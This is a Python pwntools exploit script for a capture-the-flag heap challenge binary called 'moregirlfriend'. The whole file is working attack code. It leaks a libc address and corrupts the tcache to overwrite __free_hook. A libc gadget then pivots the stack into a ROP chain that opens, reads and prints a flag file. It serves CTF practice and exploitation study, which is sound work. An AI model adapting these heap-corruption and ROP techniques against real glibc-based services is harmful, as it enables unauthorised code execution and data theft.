# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './moregirlfriend'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 1
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = ''
    port = ''
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def exhaust( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.progress('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('wow:',num)

def add(idx,size,text):
    cmd(1)
    sla('one?' , idx)
    sla('Height?' , size)
    sla('girlfriend?' , text)

def leave(count , index ):
    cmd(2)
    sla('leave you?' , count)
    for i in index:
        sla('Which girlfriend?' , i)

def delete():
    cmd(3)

# $rebase(0x4060)

# one_gad = one_gadget(libc.path)

def attack():
    add(0 , 0x420 , 'a'*0x18)
    add(1 , 0x68 , 'a'*0x18)
    leave(1 , [0])
    delete()
    add(0 , 0x420 , '\x70')
    leave(1 , [0])
    delete()

    __malloc_hook = l64()
    libc.address = __malloc_hook - libc.sym['__malloc_hook']
    __free_hook = libc.sym['__free_hook']

    for i in range(2,10):
        add(i , 0x68 , 'a'*0x18)
    leave( 7 , [i+2 for i in range(7)] )
    delete()
    leave(3, [9 , 1 , -8])
    delete()

    for i in range(7):
        add(i , 0x68 , 'a'*0x18)

    add(7 , 0x68 , p64(__free_hook))
    add(8 , 0x68 , p64(__free_hook))
    add(9 , 0x68 , p64(__free_hook))

    # 下面 2.31 标准最短开启 orw
    magic = 0x157d8a + libc.address

    # mov    rbp, qword ptr [rdi + 0x48]
    # mov    rax, qword ptr [rbp + 0x18]
    # lea    r13, [rbp + 0x10]
    # mov    dword ptr [rbp + 0x10], 0
    # mov    rdi, r13
    # call   qword ptr [rax + 0x28]

    read_addr = libc.sym['read']
    open_addr = libc.sym['open']
    puts_addr = libc.sym['puts']
    ret = libc.search(asm('ret')).next()
    leave_ret = libc.search(asm('leave;ret')).next()
    pop_rax_ret = libc.search(asm('pop rax; ret')).next()
    pop_rdi_ret = libc.search(asm('pop rdi; ret')).next()
    pop_rsi_ret = libc.search(asm('pop rsi; ret')).next()
    pop_r13_pop_r15_ret = libc.search(asm('pop r13 ; pop r15 ; ret')).next()
    pop_rdx_pop_rbx_ret = libc.search(asm('pop rdx ; pop rbx ; ret')).next()
    
    magic_chain  = flat(
        __free_hook + 0x8, pop_r13_pop_r15_ret , 
        __free_hook + 0x8, __free_hook + 0x10 ,
        pop_rdx_pop_rbx_ret, 0x300 ,
        leave_ret, pop_rsi_ret,
        __free_hook + 0x8 , pop_rdi_ret , 
        0 , read_addr 
    )
    # len magic_chain 0x60

    flag_addr = __free_hook + 0x100 + len(magic_chain) + 8
    chain = flat(
        pop_rdi_ret , flag_addr , pop_rsi_ret , 0 , open_addr,
        pop_rdi_ret , 3 , pop_rsi_ret , flag_addr , pop_rdx_pop_rbx_ret , 0x100 , 0 , read_addr,
        pop_rdi_ret , flag_addr , puts_addr
    ).ljust(0x100,'\x00') + 'flag\x00'
    # len chain 0x80
    
    payload = flat( magic ) + magic_chain
    
    add(10 , 0x68 , payload )

    leave( 1 , [10])
    # dbg('free')
    delete()

    payload =p64(ret)*0xc + chain

    sa('left you.',payload)
    # dbg()
    # sl('echo shell')
    # ru('shell')
    p.interactive()

attack()

'''
@File    :   moregirlfriend.py
@Time    :   2021/10/19 21:25:42
@Author  :   Niyah 
'''